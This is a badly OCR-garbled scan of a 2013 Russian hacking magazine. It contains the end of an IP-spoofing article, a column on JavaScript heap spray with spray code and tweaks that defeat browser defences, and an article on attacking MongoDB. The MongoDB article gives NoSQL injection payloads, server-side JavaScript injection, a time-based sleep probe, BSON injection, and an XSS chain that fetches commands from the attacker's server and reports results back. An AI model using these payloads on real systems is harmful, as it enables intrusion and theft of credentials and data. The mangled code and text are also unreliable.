'зеТир_‘ .$асТіоп, ' 2 р_аРтіп_аиТб' , $ТхТ); 

Подменяя ІРна какой-нибудьвалидный (естественнно, только 
сточкизренияформатаіадрес, мы неспалимся всистемныхлогах 
СМ5 (но незабываем, что есть еще логи веб-сервера, а может, 
и еще что-нибудь). 

Кстати, говоря об этой уязвимости, нельзя не вспомнить 
о взломе ресурса зІаскоѵегОоѵѵ.согп, где спуфинг ІР привел к пол- 
ному доступу к сайту. Дело в том, что админка сайта была доступна 
только с адреса 127.0.0.1 (ІосаІЬозТ). И это было единственным ус- 
ловием длятого, чтобы админка стала доступна. На зІаскоѵегЛоѵѵ. 
сот проверялся ВЕМОТЕ_АООВ, но конфигурация фронтенда 
при проксировании запроса на бэкенд была неправильной и ра- 
ботала схожим с функцией деШзегІРО образом. В итоге человек 
случайнозашел на сайте НТТР_Х_РОРѴѴАВОЕО_РОВ= 127.0.0.1 
(он использовал 55Н-туннель, а после коннектился к локальному 
прокси-серверу, доступ к которому был только с локалхоста и 
НТТР_Х_РОВѴ\/АВОЕО_РОВ получался как раз 127.0.0.1) и попал 
вадминку:). 

Здесья перечислил не все найденные баги отѵѵагахе, советую 
в том числе для образовательных целей прочесть весь его ресерч, 
он доступен по ссылке Ьіиѵ/5я5МРІ .ЗС 



ХАКЕР 01 /168/2013 



059 




взлом 



Алексей Синцов ІсіеІсопгиззіайдтаіІ.сот) 




КОЛОНКА 

АЛЕКСЕЯ СИНЦОВА 



НЕДР 5РРАУ: 

ВАСК ТО ТНЕ СІ.А55ІС 



ЕШЗШ 

Вся информация 
предоставлена 
исключительно 
в ознакомительных 
целях. 

Ни редакция, 
ни автор не несут 
ответственности 
за любой возможный 
вред, причиненный 
материалами данной 
статьи. 



БЫСТРЫЙЭБ НЕАР5РПАУ 



Тема Неар Бргау хоть и не нова, но каждый раз актуальна. Ведь именно эта техника используется 
для атак изе-аКег-Ігее или ВоР в куче, ну и конечно, это самый простой способ передачи боевой 
нагрузки для сііепі-вісіе эксплойтов. Так почему же вендоры не прикроют лавочку? Какие у них идеи 
и что есть на практике? 



В прошлый раз я рассказывал про использование Сапѵаз для орга- 
низации Неар Бргау. В этот раз я вернусь к Э5-версии и рассмотрю 
механизмы защиты отданной техники. 

НЕАР5РКАѴ 

В качестве примеров я буду использовать код хакера Рагѵег 
из блога ЬіЫѵ/Мидббг . Для начала давай рассмотрим классиче- 
ский код Неар Бргау, который Рагѵег использовал для ванильных 
сплоитов: 

<5сгірТ 1ап8иа§е=”]аѵа5сгір-С"> 

ѵаг саіс, сЬипк_5Іге, Ьеасіегзіге, порзіесі, порз1есІ_1еп; 
ѵаг Ьеар_сЬипкз, і; 
саіс = ипезсаре("%исссс%исссс"); 
сЬипк_зіге = 0x40000; 

Ьеасіегзіге = 0x24; 
порзіесі = ипезсареС^иѲсѲсХиѲсѲс"); 
пор5ІесІ_1еп = сЬипк_5іге - (Ьеасіегзіге + са1с.1еп§ТЬ); 
ь/ЬіІе (порзіесі. Іеп^іЬ < порз1ес!_1еп) 
порзіесі += порзіесі; 

порзіесі = порзіесі. зиЬзТгіп^Ѳ, пор$1ес!_1еп); 

Ьеар_сЬипкз = пеѵу Аггау(); 

■Рог (і = 0 ; і < 1000 ; і++) 

Ьеар_сЬипкз[і] = порзіесі + саіс; 

</зсгірТ> 

Собственно переменная саіс — это переменная для шелл-кода, 
сЬипк_5Іге — размер выделяемой памяти для одного «блока», 
Ьеасіегзіге — размер заголовка страницы, порзіесі — заполняемая 
часть памяти между началом и шелл-кодом. С некой вероятностью 
именно в эту часть и попадал указатель для перехвата управле- 
ния после триггера уязвимости. Ну и последняя часть — массив 
Ьеар_сЬипкз в цикле собирался как порзіесі + саіс, при этом порзіесі 
был в предыдущем цикле растянут до размера сЬипк_ 5 Іге — 
Ьеасіегзіге — саІс.ІепдіЬ, то есть почти на всю страницу. Этот пример 
успешно работал в ІЕ6/7, но в ІЕ8 его пришлось немного модифици- 



ровать, так как теперь аллокация происходила только при вызове 
зиЬзІгіпд, а не при присвоении элементу массива конкатенации двух 
строк. То есть весь фикс состоял в замене цикла на: 

сосІе=пор5ІесІ + саіс; 

■Рог (і = 0 ; і < 1000 ; і++) 

Ьеар_сЬипкз[і] = сосіе. 5ипзТгопе(0, сосіе. 1еп§ТЬ); 

Тем не менее, в ІЕ9 это уже не работало. И дело тут в новых 
защитных механизмах от Неар Бргау. Кстати, в РР этот Неар Бргау 
тоже не будет работать по тем же причинам. Поэтому рассмотрим, 
какие защиты существуют в теории и на практике. 

НЕАР 5РРАѴ РКЕ-АШЗСАТІСШ 

Эта техника используется в ЕМЕТ, и, по сути, данный механизм 
предотвращает выделение блоков по известным заранее адресам. 
Как это работает? Очень просто: ЕМЕТ сам выделяет память по по- 
пулярным адресам, до того как это сделает Неар Бргау. В итоге 
защитный инструмент успевает занять популярные места раньше, 
чем это сможет сделать Э5-код. Минусы данного метода очевид- 
ны — есть еще куча «непопулярных» адресов, о которых ЕМЕТ 
не знает. 

ІѴІ022І-Е 

Другая защита — ІМоггІе фактически определяет, что содержимое 
Э5-строк может быть интерпретировано как последовательность 
ассемблерных инструкций. Кроме того, важно понимать, что детек- 
тирование производится не разово, а для группы блоков и удачное 
детектирование происходит, только когда количество блоков 
с обнаруженным подозрительным содержимым превышает некий 
порог. Данный метод хорош, но он дорогостоящий с точки зрения 
нагрузки, а кроме того, если у нас шелл-код закодирован, то асм- 
инструкции располагаются только в начале (декодер шелл-кода) 
и возможны пропуски. В этом случае не исключены ситуации {аізе- 
розіііѵе. Подробнее об исследовании — Ыі.Іѵ/ТЛтгІ . 



060 



ХАКЕР 01 /168/2013 




Неар Бргау: Ьаск Іо 1Не сіаззіс 



[Й] Метогу тар 



[о' Оитр - 00990000. .009АРРРР 



00990000 

00990010 

00990020 

00990030 

00990040 

00990050 

00990060 

00990070 

00990080 

00990090 

0О9900А0 

0О9900В0 

0О9900С0 

00990000 

0О9900Е0 

0О9900Г0 

00990100 

00990110 

00990120 

00990130 



00 


00 


00 


00 


ЕО 


ГГ 


00 


00 


00 


00 


00 


00 


00 


00 


00 


00 




66 


5В 


Ж 


,04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


Б4 


Е5 


99 


ОЕ 


04 


ЕЪ 


99 


6г[ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


Б4 


Е5 


99 


ОГ 


Б4 


Е5 


99 


ОЕ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


В4 


Е5 


99 


ОГ 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


9 9 


ОГ 


П4 


Е5 


99 


ОГ 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


Б4 


Е5 


99 


ОГ 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


Ъ4 


Е5 


99 


ОГ 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


ІІ 


ог 


П4 


Е5 


99 


ог 


04 

04 


Е5 

Е5 


99 

99 


ОГ 

ОГ 


04 

04 


Е5 

Е5 




I 


ог 

ог 


04 

04 


Е5 

Е5 


99 

99 


ог 

ог 


04 


Е5 


99 


ОГ 


04 


Е5 


У У 


ог 


04 


Ео 




ог 


0 4 


Е5 


99 


ог 


04 


Е5 


9 9 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


9 9 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


9 9 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


9 9 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


9 9 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


0 4 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ОГ 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


04 


Е5 


99 


ог 


Б4 


Е5 


99 


ог 


04 


Е5 


9 9 


ог 


С 4 


Е5 


99 


ог 


04 


Е5 


99 


ог 



I ВІ 



"‘Йба’-йба^Й 

"Йба^Йба^Й 

"■Йба^Йба^Й 

"Йба^ЙОа^Й 

"‘Йба^Йба^'Й 

"•Оба^Оба^Й 

"Йба^Йба^Й 

“Йба^Йба"# 

"‘Йба^Йба^Й 

"Йба^Йба^Й 

"•Йба^Йба^Й 

ж Йба т * , Йба” , Й 

“Йба^Йба^Й 

"Йба^Йба^Й 

ж Йба п, Йба"‘Й 

"‘Йба^Йба’-Й 

“Йба^Йба^Й 

"•Йба^Йба^Й 

"•Йба^Йба^Й 



Результат спрея 
с конкатенацией 
в цикле 



віівві_е 

Другая техника защиты основана на той идее, что при Неар Бргау 
происходит выделение памяти под одинаковые данные. Шелл-код 
и пор_5ІесІ один и тот же во всех блоках. Поэтому предлагается 
ввести проверку определенных сегментов (байтов) с блока перед 
выделением, сравнивая с предыдущим. И при совпадении для опре- 
деленного числа блоков (опять порогугрозы) механизм блокирует 
действие. Данный метод опять же хорош, но также влияет на про- 
изводительность. Согласно исследованию, оверхед будет -5%. 

Как по памяти, так и по времени. Подробнее об этой технике в том же 
исследовании: Ы1.1у/5А4Н9Ь . 

СУРОВАЯ ПРАКТИКА 

Понятно, что разработчики браузеров не очень хотят внедрять 
«тормозящие» проверки, учитывая, что с некоторой вероятностью 
они будут «сломаны», а потому бесполезны. Так, Неар Бргау Рге- 
АИосаІіоп есть только в ЕМЕТ. По слухам, то ли ІЧоггІе, то ли ВиЬЫе 
как раз имеется в браузерах Рігеіох и ІЕ9. Взяв наш пример (с 
зиЬзІгіпд-модификацией), ты можешь убедиться сам, что он не ра- 
ботает. 

При этом разработчики браузеров «подстраховались» с точки 
зрения организации излишней нагрузки. Так, согеІапсОбЗг в своем 
блоге описал, что механизм «быстренько» проверяет только первые 
байты, и если там будет различие для небольшого числа блоков, 
то все ОК. То есть нам достаточно изменять каждый байт в каждом 
новом блоке, и защита распадется на кусочки. Чтобы заставить 
работать данный пример в ІЕ9/РР, достаточно пропатчить его: 

сосІе=пор5ІесІ + саіс; 

Тог (і = 0 ; і < 10000 ; і++) 

{ 

сосІеиіТЬпит = рас!пііт(і,4) + сосіе; 

Иеар_сЬипк5[і] гсосІеміТЬпит. зиЬз-Сгіп§(0, 
сосІеѵуіТЬпит. Іеп^ТЬ) ; 

} 



Тут рабпит — это функция, которая возвращает число і в виде 
четырехразрядной строки. То есть ра6пит(1,4) = "ОООГ. Баналь- 
ный четырехразрядный счетчик. Этой модификации достаточ- 
но, чтобы обмануть псевдо-ВиЬЫе в РР и ІЕ9. Собственно, эта 
информация была как у согеіап'а, так и на блоге дгеаЬаІНаскег. 

Но мои эксперименты показали, что эти действия избыточны. Тут 
нет никакого ВиЬЫе/МоггІе вообще. Истинная причина, почему 
эти методы работали, не в том, что там рандом или неассемблер- 
ные инструкции, а в банальной конкатенации в цикле. То есть 
работает и так: 

согіе=порз1есІ + саіс; 

-Рог (і = 0 ; і < 10000 ; і++) 

{ 

сосІемШіпит = ”]["+ сосіе; 

Ьеар_сЬипк$[і] =сосІемі-СІтит. 5иЬз1:г1п§(0, «-< 
сосІеміТИпит . 1еп§1:Рі ) ; 

} 

Получается, мы вернулись практически к тому, с чего все нача- 
лось. Если есть конкатенация строк в цикле, то зиЬзІгіпд выде- 
ляет память без проблем. Никаких сложных алгоритмов или иных 
хитростей. 

ИКНІ 

Очевидно, что методики защиты от Неар Бргау достаточно 
трудоемки и сложны. Особенно учитывая, что это не конкретная 
атака, а целый класс техник, которые приводят к определенному 
результату (например, спрей через зѵ\^ или НТМІ.5). Главное пре- 
имущество приведенной техники ЗБ — скорость. Спрей проходит 
в течение одной секунды. Но недостаток у данного метода также 
есть — невозможно генерировать маленькие блоки произвольного 
размера. Это приводит к тому, что данная техника, которая рас- 
смотрена тут, не годится для эксплуатации изе-аКеМгее уязвимо- 
стей, где размер имеет значение. До скорых встреч! ІЕ 



ХАКЕР 01 /168/2013 



061 





взлом 



Михаил «суЬег-рипк» Фирстов Ровіііѵе ТесЬпоІодіез (Ьир5://М«ег.сот/суЬегрипкусЬ, тІігзІоѵШрІзесигіІу.ги) 



СЦЕНАРИИ АТАКИ 
НА N0501 БАЗУ 




Удар. 

по МопдоОВ 




ДД 

Вся информация 
предоставлена 
исключительно 
в ознакомительных 
целях. 

Ни редакция, 
ни автор не несут 
ответственности 
за любой возможный 
вред, причиненный 
материалами данной 
статьи. 



Сейчас все чаще и чаще программисты используют 
N0501 базы данных для различных приложений. 
Методы атак на №501_ еще мало изучены и не так 
распространены, как обычные БОЬинъекции. 

В данной статье будут рассмотрены возможные 
варианты атаки на веб-приложение через уязви- 
мости, связанные с использованием МопдоОВ. 

АЗБУКА М0Ы6СЮВ 

Прежде чем говорить об уязвимостях в МопдоОВ, не могу не рас- 
сказать, что вообще представляет собой эта база данных. Ее 
название сейчас особенно на слуху: если посмотреть материалы 
об устройстве бешено популярных веб-проектов, то почти в каждом 
будет упоминание N0501 баз данных, и чаще всего в этом контексте 
звучит именно МопдоОВ. Более того, именно Монгу МісгозоП пред- 
лагает использовать в ее облачной платформе Агиге в качестве не- 
реляционной базы данных — чем не доказательство, что скоро этой 
БД найдется применение еще и в серьезном корпоративном софте? 

Если кратко, то МопдоОВ — это чрезвычайно производительная 
(за что, собственно, ее и любят), расширяемая (легко разносит- 
ся на несколько серверов, если есть необходимость), открытая 
(что позволяет крупным компаниям подстраивать ее под себя) база 
данных, которая относится к категории МоБОЬ. Последнее озна- 
чает, что в ней нет поддержки привычных 501-запросов, однако 
она поддерживает свой собственный язык запросов. Если уточнять 
далее, то для хранения данных МопдоОВ использует докумен- 
то-ориентированный формат (на базе 350М), при этом не требует 
описания таблиц. 

Любой, кто скачает дистрибутив Монги, увидит два исполняе- 
мых файла: Мопдо и топдоб. Мопдосі — это непосредственно сер- 
вер базы данных, который хранит данные и обслуживает запросы, 
а Мопдо — это официальный клиент, написанный на С++ и 35 (Ѵ8). 

СТАВИМ, СМОТРИМ, ИССЛЕДУЕМ 

Не буду останавливаться на банальностях вроде установки БД — 
разработчики делают все, чтобы все было легко поднять, даже 
не обращаясь к мануалам. Перейдем сразу к тому, что показалось 
мне действительно интересным. Первая составляющая, которая 
меня заинтересовала, — это ВЕ5Т-интерфейс. Он представляет 
собой веб-интерфейс, который запускается по умолчанию на порту 
28017 и позволяет администратору управлять своими базами дан- 
ных удаленно через браузер. Немного поработав с этим функциона- 
лом СУБД, я нашел сразу несколько уязвимостей — две хранимые 
Х55, недокументированное исполнение 5535 (5егѵег 5ісіе Заѵа 
5сгірІ) кода и множественные С5РР. Это меня дико позабавило, 
и я решил не останавливаться на достигнутом :). Как выглядит этот 
самый РЕ5Т-интерфейс, ты можешь увидеть на рис. 1. 



Расскажу немного подробней о найденных уязвимостях. Две 
хранимые Х55 присутствуют в полях Сііепіз и 1_од. Это значит, 
что если провести любой запрос к БД, в котором у нас есть 
НТМЬкод, то он запишется в исходный код страницы РЕ5Т- 
интерфейса и исполнится в браузере того, кто туда зайдет. 

На основе этих уязвимостей можно провести атаку по следую- 
щей схеме (рис. 2): 

1. Посылаем запрос с тегом 5СРІРТ и адресом нашего 35-скрипта. 

2. Администратор открывает браузером веб-интерфейс, и наш 35- 
код исполняется в его браузере. 

3. Через 350ИР скрипт запрашивает с нашего удаленного сервера 
команды на исполнение. 

4. Получив команду, он исполняет ее, используя недокументиро- 
ванное исполнение 5535-кода. 

5. Результат исполнения отсылается на наш удаленный хост, 
на котором он записывается в лог. 

Что же касается недокументированного исполнения 5535-кода, 
я набросал для тебя небольшой концепт, который можно расши- 
рить по своему усмотрению: 

Ь-С-Ср : //ѵіііп-Нобі: : 28017/асІтіп/$стсІ/ ?б1*ег_еѵа1=*-* 

•Рипс*іоп( ){ ге*игп сІЬ. ѵегзіопО }&1іті-1:=1 

В этом примере (рис. 3) $стс! — это недокументированная 
функция, но мы-то теперь знаем... :) 

ИГРАЕМ С ДРАЙВЕРОМ 

Как известно, для того чтобы работать с любой серьезной БД 
из скриптовых языков, например РНР, необходимо иметь драйвер 
этой самой БД, который будет служить транспортом. Я решил разо- 
браться с этими самыми драйверами для МопдоОВ и не стал тут 
оригинальничать, выбрав драйвер в поставке РНР. 

Предположим, что есть полностью настроенный сервер 
с АрасЬе + РНР + МопдоОВ и уязвимый скрипт. Ниже приведены 
основные фрагменты данного скрипта: 

$ц = аггауС’пате" => $_6ЕТ[ '1о§іп' ], "ра55иогсГ => «-« 
$_СЕТ[ ' разБмогсІ ' ] ) ; 

$сиг50г = $со11ес1:іоп->Яп(Юпе($д); 

После получения данных скрипт делает запрос к БД МопдоОВ. 
Если данные верные, то в ответ он получает массив с выводом 
данных этого пользователя и выводит его в таком виде: 

есЬо ^ате: ' . $сигзог[ 'пате' ]; 

есЬо ' Ра55ѵ»/огсІ : ' . $сиг5ог[ ' разБмогсІ ' ]; 

Предположим, что ему отправили вот такие параметры (ігие): 

?1о§іп=асІтіп&ра55могсІ=ра77м0гсІ 



062 



ХАКЕР 01 /168/2013 



Удар по МопдоРВ 




Рис. 1. Неприметный КЕ5Т-интерфейс 



Тогда запрос к базе будет выглядеть следующим образом: 

сІЬ.і1:ет5.бпсІ0пе({"пате" :"асітіп и , "раззмогсГ : 
н ра77мѲгсІ">) 

Так как в базе существует пользователь асітіп с паролем ра77\л/0гсі, 
то в ответ выводятся его данные (Ігие). Если же подставить другое 
имя или пароль, то запрос ничего не вернет (іаізе). 

В МопдоРВ есть условия, которые аналогичны привычному 
ѵѵЬеге, за исключением некоторых различий в синтаксисе. Так, 
чтобы вывести из таблицы с именем ііетз записи, у которых пате 
не равно асітіп, нужно написать следующее: 

с1ЬЛ-1:ет5.бп(1({"пате" :{$пе : "асітіп"}}) 

Я думаю, у тебя уже появилась идея, как такую конструкцию мож- 
но обмануть. На языке РНР достаточно подставить еще один массив, 
чтобы вставить его в другой, который отправляется функцией ііпсіОпе. 

Переходим оттеории к практике. Для начала создадим запрос, 
выборка которого будет удовлетворять следующим условиям: значе- 
ние разБѵѵогсі не будет равно 1, а игег будет асітіп: 

сіЬ Ліетз.бпсі0пе({"пате" : "асітіп", #-і 
"раззмогсГ : {$пе : "1"}}) 

В ответ приходит информация об упомянутой учетной записи: 

{ 

"_ісГ : ОЬдес'СІсК , ■4■Р<^а5559е5а■Р(к4е22ѲѲѲѲ0Ѳ ,, ) , 

"пате" : " асітіп ", 

"раззмогсГ : н ра77м0гсі" 

} 

В синтаксисе РНР это будет выглядеть так: 

$Я = аггау("пате" => "асітіп", "раззмогсГ => ♦-< 
аггау("\$пе" => "1")); 

Для эксплуатации достаточно будет объявить строковую пере- 
менную раззѵѵогсі как массив следующим образом: 



$сигзог1 = $со11есііоп->ЯпсІ(аггау("1о§іп" => $изег, 

"разз" => $разз) ); 

После чего полученные из БД данные отображаются на страни- 
це с помощью следующей конструкции: 

есЬо 'ісі: $оЬд2[ЛсГ] . ’<Ьг>1о§іп: 4 -і 

$оЬд2[ ' 1о§іп ' ] . ’ <Ьг>разз : $оЬд'2[ ’ ра 55 ' ] . ’<Ьг>*; 

При помощи регулярки мы можем получить все данные из БД, 
для этого достаточно лишь немного поиграть с типами передавае- 
мых скрипту переменных: 

?1о§іп [ $ге§ех] = Л &раззмогсі [ $ге§ех ] = л 

На что получим в ответ: 

ісі: 1 

1о§іп: Асітіп 
разз: рагоі 
ісі: 4 

1о§іп: изег2 
раз5: еосііоѵетап 
ісі: 5 

Іо^іп: изегЗ 
разз: Тиск1:Иеро1ісе= 

Все успешно работает. Существует еще один неплохой способ 
эксплуатации подобных брешей — использование оператора 
$іуре: 

?1оеіп[$поТ] [$іуре]=1&раззмогсІ[$по‘1:] [$іуре]=1 

Вывод в этом случае будет таким: 

Іо^іп: Асітіп 
разз: рагоі 
ісі: 4 

1о§іп: изег2 
разз: §осІ1оѵетап 
ісі: 5 

1о§іп: изегЗ 
ра5з: Тиск1:Ьеро1ісе 

Такие фокусы успешно работают и в функции ііпсіО, и в функции 
ііпсіОпеО. 

ВНЕДРЕНИЕ В 5535-ЗАПРОСЫ 

Второй тип уязвимости в реализации связки МопдойВ и РНР 
основан на возможности внедрить свои данные в 5535-запрос, 
проходящий к серверу. 



?1о§іп=асітіп&ра55могсІ[$пе]=1 

Результатом будет вывод данных админа (ігие). Решением этой 
проблемы может быть использование функции із_аггау() и приве- 
дение входящих аргументов к типу зігіпд. 

Маленькое дополнение к таким функциям, как ііпсЮпеП 
и ііпсШ, — в них можно и нужно использовать регулярные выраже- 
ния. Для этого существует такая замечательная штука, как $гедех. 
Пример использования: 

сІЬ Л*етз.6псІ({пате: {$ге§ех: " л у"}}) 

Такой запрос найдет все записи, в которых пате начинается с «у». 
Предположим, что в скрипте используется примерно такой за- 
прос к БД: 




Рис. 2. Схема атаки 



ХАКЕР 01 /168/2013 



063 



взлом 



Предположим, у нас есть уязвимый код, который выполняет 
запись пользовательских данных в БД, а после, в ходе работы, их 
оттуда выводит, причем не все, а только значения из определенных 
полей. Пусть это будет простейшая гостевая книга. 

Продемонстрирую это на примере кода. Предположим, 
что ІМБЕКТ-запрос выглядит следующим образом: 

= "-РипсТіопО { ѵаг Іо^іпп = ’$1о§іп’; <►* 
ѵаг раз 5 5 = ’Іразз'; сИэ.тетЬег5.іпзегІ:({ісІ : 2 , «-« 

1о§іп : 1о§іпп, раз 5 : раззз}); }"; 

Одно немаловажное условие — переменные $раз5 и $Іодіп бе- 
рутся напрямую из массива $_6ЕТ и никак не фильтруются (да-да, 
это явный фейл, но встречается он сплошь и рядом): 

$1о§іп = $_СЕТ[ ' 1о§іп ' ]; 

$ра55 = $_СЕТ[ ' раззмогсі ’ ] ; 

Далее приведен код, который исполняет данный запрос и выво- 
дит данные из БД: 

$сИз->ехеси*е($ц); 

$сигзог1 = $со11ес1:іоп->ЯпсІ(аггау ("ісГ => 2)); 
-РогеасН($сигзог1 аз $оЬ]2){ 

есііо "Ѵоиг 1о§іп: " .$оЬд2[ 'Іо^іп’ ]; 
есНо "<Ьг>Ѵоиг раззмоггі: " .$оЬ}2[ ’ разз ' ] ; 

} 

Тестовый скрипт готов — переходим к практике. Отправляем 
тестовые данные: 

?1о§іп=изег&раззмогсІ=ра55могсІ 

В ответ мы получим следующие данные: 

Ѵоиг 1о§іп:изег 
Ѵоиг раззмогсНраззмогсІ 

Давай попробуем эксплуатировать уязвимость, которая заклю- 
чается в том, что данные, которые идут в параметр, не фильтруются 
и никак не проверяются. Начнем с простого — с кавычки: 

?1о§іп=изег&раззѵуюгсІ= ' ; 

Нам отобразилась другая страница, и 55^-код из-за ошибки 
не исполнился. Но совсем другая ситуация будет, если послать вот 
такие данные: 

/РІоеіп^зег&раззмогс^І’ ; ѵаг а = ’1 

Отлично. Но как теперь получить вывод? Все очень просто: до- 
статочно перезаписать переменную, например Іодіп, и тогда в БД 
попадет результат исполнения нашего кода и в ответе можно будет 
увидеть вывод! На практике (рис. 4) это выглядит так: 

?1о8іп=изег&ра55ілюггі=1' ; ѵаг Іоеіпп = ОЬ. ѵегзіоп(); 
ѵаг Ь=' 

Чтобы было понятнее — .ЛБ-код принимает следующий вид: 

$Я = "-РипсТіопО { ѵаг 1о§іпп = изег; удус раззз = 

' 1’; ѵаг 1о§іпп = сІЬ. ѵегзіоп(); ѵаг Ь=’’; сІЬ.тетЬегз.-' 
іпзегС({іс! : 2, 1о§іп : 1о§іпп, разз : раззз}); }" 

Первое, чего мы хотим, — это прочитать сторонние записи. 
Делаем это при помощи простого запроса: 



^ Ч 127ЛЛ.1 ЫМЫІ 

< 

"о«эес" : О, 

"гоѵэ": [ 

< "гесѵаі" : "2.0.4", "о*" : 1 > 

*сосаі_гсѵа" : 1 , 

"фіегу* : < "еѵаі" : "«ипссіопО (ѵаі - йЬ.ѵегэіопО і гесигп ѵаі; )" } , 
"иііііа" : О 



Рис. 3. Недокументированные возможности 



^ 127.0Л1:80Ѳ0'іпгісх1.рЬр?к)д<п=и«е<&р«иѵисг<і=Г; ѵаг Іодтг» = сіЬ.ѵегсіопО; ѵаг Ь=' 

м»: 2 

1о?ш: 2.0.4 

ра»: 1 



Рис. 4. Результат инъекции 55.15-кода 

/?1о§іп=изег&раз5могсІ= ѵаг 1о§іпп = едзоп.-; 
(сІЬ.тетЬегз.бпсІО [0]); ѵаг Ь=’2 

Для лучшего понимания рассмотрим этот запрос под микроскопом: 

1. Используетсяужезнакомая конструкция для перезаписи пере- 
менной и исполнения произвольного кода. 

2. С помощью функции ІоізопІ) мы получаем полноценный ответ 
из БД. Если бы мы не использовали ее, то в ответ получили бы 
Аггау. 

3. Самая главная часть — это вызов гіЬ.тетЬегз.КпсЯКО]. Здесь 
тетЬегз— это таблица, а РіпгіП — функция, которая выводит 
все записи. Наконец, массив в конце обозначает номер записи, 
к которой мы обращаемся, — вот как раз с помощью перебора 
значений в этом массиве мы получаем записи из БД. 

Конечно же, возможна ситуация, когда вывод отсутствует, и, 
чтобы получить данные, придется использовать технику Тіте- 
ВазесІ, которая основана на задержках сервера в ответах на за- 
прос, в зависимости от выполнения какого-либо условия (Ігие/ 
Раізе). Приведу пример: 

РХоез.п^зег&раззмогс^’ ; і-Р (сІЬ. ѵегзіоп( ) > ”2") { «-* 
з1еер(10ѲѲ0); ехіі; } ѵаг 1о§іпп =1; ѵаг Ь='2 

С помощью этого запроса мы узнаем версию БД. Если она больше 
2 (например, 2.0.4), то выполнится наш код и сервер вернет ответ 
на наш запрос с заметной задержкой. 

В остальных языках программирования все обстоит примерно 
таким же образом. То есть если мы имеем возможность передать 
в запрос массив, то мы с легкостью сможем провести ІМоБСІІ-- 
инъекцию, основанную на логике или регулярных выражениях. 

СМОТРИМ ТРАФИК 

Как известно, в МопдойВ можно создать конкретного пользова- 
теля для определенной БД, что неудивительно. Информация о су- 
ществующих в БД пользователях хранится в таблице сіЬ.зузІет. 
изегз (рис. 5). Наибольший интерес для нас представляют поля 
изег и рѵѵсі упомянутой таблицы. В колонке изег — логин пользо- 
вателя, а в рѵѵсі — Мйб-строка %Іодіп%:топдо:%раз5ѵѵогсі%, где 
Іодіп и раззѵѵогсі — это логин и хеш-сумма логина, ключа и пароля 
пользователя. 

Все данные (рис. 6) передаются в открытом виде, и, перехватив 
пакет, не составит труда извлечь оттуда определенные данные, 
которые необходимы для получения имени и пароля пользователя. 
Для этого нужно перехватить попсе, Іодіп и кеу, которые отправ- 
ляет клиент при авторизации на сервере МопдоОВ. В кеу у нас 
содержится М 05-строка следующего вида: «%попсе% + %Іодіп% + 
тсі5(%Іодіп% + ":топдо:" + % ра 5 зѵѵосі %) ». 



064 



ХАКЕР 01 /168/2013 



Удар по МопдойВ 




Рис. 5. Создание пользователя в БД 



Как видно, вполне легко написать программу, которая будет ав- 
томатически перехватывать и подбирать логин и пароль на основе 
перехваченных данных. Как перехватить данные — начни копать 
в сторону того же АВР Брооііпд. 

УЯЗВИМОСТИ ПРИ ОБРАБОТКЕ В50Ы 

Не будем останавливаться на достигнутом и рассмотрим другой 
тип уязвимостей, который основывается на неправильном парсин- 
ге ВБСМ-объекта, передаваемого в запросе к БД. 

Для начала пару слов о том, что представляет собой В50ІМ. 
В50ІМ (Віпагу .ІаѵаБсгір* О^есі Моіаііоп) — это компьютерный 
формат обмена данными, который позволяет хранить в таблице 
данные различных типов (ВооІ, іпі, зігіпд и так далее). Предпо- 
ложим, что имеется коллекция (проще говоря, таблица) с двумя 
записями: 

> сІЬ.іе5і.«п<1({}) 

{ "_ісГ : ОЬ:есіІсІ("5044еЬсЗа91Ь02е9а9Ь065е1"), 

"пате" : "асітіп", "ізасітіп" : ігие } 

{ "_ісГ : ОЬд‘есіІсІ("5044еЬсЗа91Ь02е9а9Ь065е1"), 

"пате" : "поасітіп", "ізасітіп" : -РаІБе } 

и имеется запрос к БД, в который мы можем внедриться: 

хІЬ.іезі.іпзегіЦ "пате" : "поас1тіп2", - 
"ізасітіп" : -Раізе}) 

Просто вставляем специально сформированный ВБОІЧ-объект 
в имя колонки пате: 

хІЬ.іезі.іпзегіЦ и пате\х16\х0Ѳ\х08ізасІтіп\хѲѲ\х01\х00Ѵ-. 
х00\х0Ѳ\х00\х00" : "поа<1тіп2", "ізасітіп" : -Раізе}) 

Как видишь, поставив перед значением колонки ізасітіп байт 
0x08, мы указали, что тип добавляемых нами данных — Ьооіеп, 
и следующим байтом — 0x01 — мы присвоили значение объекту 
как Ігие, тем самым перезаписав значение іаізе, которое устанав- 
ливается по умолчанию. Вся соль здесь состоит в игре с типами 
переменных. Поиграв с ними, можно полностью перезаписать 
данные, которые подставляются к запросу автоматически. 

И теперь посмотрим, что у нас оказалось в таблице: 

> гіЬ.іезі.ЯпсІ({}) 

{ "_ісі" : ОЬз есіісі ( “ 5044еЬсЗа91Ь02е9а9Ь065е1 ” ) , 

"пате" : "асітіп"., "ізасітіп" : ігие > 

{ "_ісГ : ОЬдесіІсІ ( " Б044еЬсЗа91Ь02е9а9Ь06Бе1 " ) , 

"пате" : "поасітіп", "ізасітіп" ; -Раізе } 

{ "_ісГ : ОЬз есіісі ( " 5044еЬ-Р6а91Ь02е9а9Ь065еЗ" ) , 

"пате" : пиіі, "ізасітіп" : ігие, "ізасітіп" : ігие } 



СаріигеО раскеіз: 




